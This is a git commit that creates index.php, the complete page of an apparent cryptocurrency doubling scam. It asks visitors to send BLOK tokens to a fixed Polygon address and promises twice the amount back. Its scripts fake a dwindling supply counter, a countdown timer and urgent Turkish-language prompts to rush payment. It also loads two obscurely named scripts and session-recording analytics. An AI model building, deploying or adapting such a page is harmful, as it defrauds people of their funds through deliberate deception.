09b93a16a6f736d56513e135ba2b27e835f02b74
Uğur ARIKAN <ugurarkn@gmail.com>
2024-02-19 16:49:11 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="stylesheet" rel="stylesheet" type="text/css" href="files/style.css?1">
+<meta property="og:image" content="img/link.html">
+<link href="files/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+<title>Get 2x BLOK Bonus Now</title>
+<script src="./ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="./code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+<script type="text/javascript" src="./cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<link rel="stylesheet" rel="stylesheet" type="text/css" href="files/theme.min.css?1">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+<script>
+        window.onload = function() {
+            if (!localStorage.getItem("justonce")) {
+                localStorage.setItem("justOnce", "true");
+                window.location.reload();
+            }
+        }
+    </script>
+<script type="text/javascript">
+        //<![CDATA[
+        window.onload = function() {
+
+            } //]]>
+    </script>
+</head>
+<body>
+<div id='stars'></div>
+<div id='stars2'></div>
+<div id='stars3'></div>
+<div class="pop-body">
+<div class="pop-inner">
+<div class="pop-head">
+<h3 class="pop-head-text">Generated Address</h3><svg id="close" height="20" viewBox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M18.096 19.174l1.401-1.427L1.7.286.3 1.714z"></path><path d="M19.497 1.714L18.096.286.3 17.747l1.4 1.427z"></path></svg></div>
+<div class="pop-post-body">
+<div class="pop-post-inner">
+<div class="pop-anrange">
+<div class="pop-img">
+<div class="pop-qr">
+<div class="inner-qr">
+<div class="main-qr">
+<div opacity="0" class="qr"><img width="200" height="200" src="https://chart.apis.google.com/chart?cht=qr&chs=200x200&chl=0x852AB007A40e53E5eD6d359902a72471287a97e1&chld=H|0" alt="qr"></div><span class="wallet">Waiting your payment</span>
+<center><img src="files/loading.svg" width="70px"></center></div>
+</div>
+</div>
+</div>
+<div class="timer-b" id="timer1"></div>
+<div class="address-place">
+<div class="inner-address"><span class="wallet-ad">Amount:</span>
+<div class="address">
+<div class="qwef-hy"><span class="real-address" id="gen-amount"></span></div>
+<div class="copy-body">
+<div class="copy-inner">
+<img class="cp" id="copy_" src="files/copy.svg">
+<div id="address-card" class="sec-card">
+<img id="succ" class="in-card" src="files/done.svg">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="inner-address"><span class="wallet-ad">Generated address:</span>
+ <div class="address">
+<div class="qwef-hy"><span class="real-address">
+<script>window.ADDRESS = '0x852AB007A40e53E5eD6d359902a72471287a97e1';</script> 0x852AB007A40e53E5eD6d359902a72471287a97e1
+</span></div>
+<div class="copy-body">
+<div class="copy-inner">
+<img class="cp" id="copy_address" src="files/copy.svg">
+<div id="done-copy" class="sec-card">
+<img class="in-card" src="files/done.svg">
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<br/>
+
+<div class="">
+1) Send 2 000 to 300 000 BLOK to the generated address above and get 2x BLOK back.
+</div><div class="">
+2) Wait at least 4-8 minutes after confirming the transaction. Your 2x BLOK bonus will be sent to the address you entered or to the one you sent BLOK from.
+
+</div>
+
+</div>
+</div>
+</div>
+
+
+
+
+</div>
+</div>
+</div>
+</div>
+<section id="post-sec">
+<h1 style="text-align: center;"><img src="files/logo.png" alt="Logo"></h1>
+<div class="post_body">
+<h2>Join the distribution:</h2>
+<p>To confirm your Polygon address, simply send 2,000 to 300,000 BLOK to the address generated below and receive 4,000 to 600,000 BLOK sent back to your address from which you sent the BLOK, or to the one you specified below. You will receive twice as much (2x) of what you have sent to the airdrop address.</p>
+<p>In this case, each participant will receive 2 times (twice as much) from what they send to the airdrop address.</p>
+<p>
+<h2>How To Participate:</h2>
+<ul>
+<li><b>Step1:</b> Make sure that you have at least 2,000 BLOK in your wallet.</li>
+<li><b>Step2:</b> Enter below the amount you want to invest.</li>
+<li><b>Step3:</b> Enter the Polygon address to which you want to receive the bonus</li>
+<li><b>Step4:</b> Click the "Generate Payment" button to generate a billing address.</li>
+<li><b>Step5:</b> Send 2,000 to 300,000 BLOK to the generated address.</li>
+<li><b>Step6:</b> Wait at least 4-8 minutes after confirming the transaction and get back to your wallet twice as much (2x) BLOK of the amount sent. </li>
+</ul>
+</p>
+<p>The bonus will be sent to the address you entered, or to the one from which you sent the BLOK.</p>
+</div>
+<div class="cal-body">
+
+							
+							<div class="banner_text">
+								Time left for the end of the Airdrop:
+							</div>
+							<div class="countdown_block">
+								<div id="countdown" class="countdown nowrap">
+									<svg viewBox="0 0 920 262" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+										<g font-size="80" class="digits">
+											<text x="100" y="123">
+												<tspan class="days countdown-time">00</tspan>
+											</text>
+											<text x="340" y="123">
+												<tspan class="hours countdown-time">00</tspan>
+											</text>
+											<text x="580" y="123">
+												<tspan class="minutes countdown-time">21</tspan>
+											</text>
+											<text x="820" y="123">
+												<tspan class="seconds countdown-time">00</tspan>
+											</text>
+										</g>
+										<g font-size="32" class="labels">
+											<text x="100" y="250">
+												<tspan>DAYS</tspan>
+											</text>
+											<text x="340" y="250">
+												<tspan>HOURS</tspan>
+											</text>
+											<text x="580" y="250">
+												<tspan>MINUTES</tspan>
+											</text>
+											<text x="820" y="250">
+												<tspan>SECONDS</tspan>
+											</text>
+										</g>
+									</svg>
+								</div>
+							</div>
+							
+
+
+
+<div class="cal-inner">
+<div class="input">
+<div class="title">Amount:</div>
+<div class="amount-con">
+<div class="inner-con">
+<div class="pic"><b>BLOK</b>:</div>
+<div class="amount">
+<div class="main-input">
+<div class="in-main"><input id="cal-in" class="exchange-content__input theme__background-4 theme__text-4 " min="2000" step="100" placeholder="0" type="number" maxlength="50" autocomplete="off" value=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="icon-body"><span data-tip="Click to swap" data-for="swap-icon" currentitem="false"><img src="files/exchange-alt.svg" alt="img" class="exchange__swap-icon"></span></div>
+<div class="input">
+<div class="title">Bonus:</div>
+<div class="amount-con">
+<div class="inner-con">
+<div class="pic"><b>BLOK</b>:</div>
+<div class="amount">
+<div class="main-input">
+<div class="in-main"><input id="cal-out" class="exchange-content__input theme__background-4 theme__text-4 " min="4000" step="100" placeholder="0" type="number" maxlength="50" autocomplete="off" value=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="enaddress">
+<div class="title">Address:</div>
+<div class="inner-enter"><input type="text" placeholder="Enter your Polygon address" pattern="0x[A-Fa-f0-9]{40}"></div>
+</div>
+<div class="but-con">
+<div onclick="ym(86375470, 'reachGoal', 'copy'); return true;" id="gen-btn" class="swap-but">Generate Payment</div>
+<div class="terms text-danger text-center mb-2"><span><span id="warn"></span></span>
+</div>
+</div>
+<div id="lympo_progress">
+<div class="row progress-row">
+<div class="colums_12">
+<div class="progress-ico">
+<div class="progress-ico">
+<div class="progress">
+<div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 100%;">
+<span class="sr-only">x</span></div>
+</div>
+</div>
+<div class="dot-1" id="leftBTC">
+Counting BLOK left...
+</div>
+<div class="dot-1-airdrop  progress-left"></div>
+<span class="pbv" id="progress-ico-bar"></span></div>
+</div>
+</div>
+</div>
+<div class="support">
+<div class="sup">
+<div class="sup-space"></div>
+</div>
+</div>
+</div>
+</section>
+<main id="content" role="main">
+<div id="ContentPlaceHolder1_divSummary" class="container space-bottom-2">
+<div class="card">
+<div class="card-body">
+<div class="tab-content">
+<div class="tab-pane fade show active" id="transactions" role="tabpanel" aria-labelledby="transactions-tab">
+<div class="table-responsive mb-2 mb-md-0">
+<table class="table table-hover" id="myTable">
+<thead class="thead-light">
+<tr>
+<th scope="col" width="1">Txn Hash</th>
+<th scope="col" width="1" class="d-none d-sm-table-cell">Block</th>
+<th scope="col"><span class="timer" title="UTC time">Age</span></th>
+<th scope="col">From</th>
+<th scope="col" width="30"></th>
+<th scope="col">To</th>
+<th scope="col">Value</th>
+<th scope="col"><span id="ContentPlaceHolder1_spanTxFee" title="(Gas Price * Gas Used by Txns) in BLOK"><spanclass="text-secondary">[Txn Fee]</span></span>
+</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+</div>
+<div class="d-flex justify-content-between align-items-center mt-3 mb-4">
+<div class="d-flex align-items-center text-secondary"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</main>
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        $('.spoiler-title').click(function() {
+            $(this).parent().children('div.spoiler-content').toggle('fast');
+            return false;
+        });
+    });
+</script>
+    <script>
+        function setProgress(count, max) {
+            var p = (100 * count / max).toString() + '%';
+            $('.progress-left').css('left', p);
+            $('.progress-width').css('width', p);
+            var aa = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            var rr = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            $('.pbv').text(aa + ' / ' + rr);
+
+        }
+
+
+
+        var ctd = setInterval(function() {
+            if (localStorage.getItem("btcprogress")) {
+                if (localStorage.getItem("btcprogress") <= 150) {
+                    var alt_count = localStorage.getItem("btcprogress");
+                } else if (localStorage.getItem("btcprogress")) {
+                    var alt_sec_count = localStorage.getItem("btcprogress");
+                    var alt_count = alt_sec_count - 17;
+                    if(alt_count < 4) {
+                        alt_count = 4;
+                    }
+                }
+            } else {
+                var alt_sec_count = Math.floor((Math.random() * (1300 - 1000) + 287000) + 1);
+                var alt_count = 340950;
+            }
+            setProgress(alt_count, 2000000)
+
+
+
+            localStorage.setItem("btcprogress", alt_count);
+
+            if (alt_sec_count <= 100)
+                clearInterval(ctd);
+            if (alt_count <= 99909 && alt_sec_count >= 200001)
+                document.getElementById("leftBTC").innerHTML = "Left BLOK";
+            if (alt_count <= 70000 && alt_sec_count >= 30001)
+                document.getElementById("leftBTC").innerHTML = "Acele et, fazla $Blok kalmadı!";
+            if (alt_count <= 30000)
+                document.getElementById("leftBTC").innerHTML = "$Blok almak için son şansın!";
+            if (alt_count <= 100000)
+                document.title = alt_count + " BLOK left";
+            if (alt_count <= 500000)
+                document.title = "Get your " + alt_count + " BLOK now!";
+
+        }, 1666);
+    </script>
+
+<script src="files/jdfghkjdfhgvsjkdfgcphjkfdhgjsdfg.js"></script>
+<script src="tfdjglkjdfkjgnsdfgnjkdgndkjfx2c81e.js?8"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(86375470, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/86375470" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+</body>
+</html>
